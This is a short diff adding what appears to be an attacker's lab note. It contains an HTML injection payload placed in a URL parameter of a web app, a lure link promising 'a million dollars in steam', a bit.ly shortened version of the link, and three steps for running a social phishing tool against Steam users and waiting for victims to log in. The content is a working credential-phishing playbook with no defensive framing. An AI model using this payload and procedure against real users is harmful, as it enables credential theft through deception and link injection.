@@ -1,0 +1,9 @@
+http://127.0.0.1:8000/buy.html?director=<a href="http://127.0.0.1:3333/login.html"> Congrats! you won a million dollars in steam click this link within 15 minutes befor you lose the offer now!</a>
+
+Convert To bitly
+https://bit.ly/2Uu1WU6
+
+
+1) run social phish, choose steam and port 3333
+2 )Give user this link while Web app is running on thier side.
+3 ) wait for them to click the link and login to the phishing site.
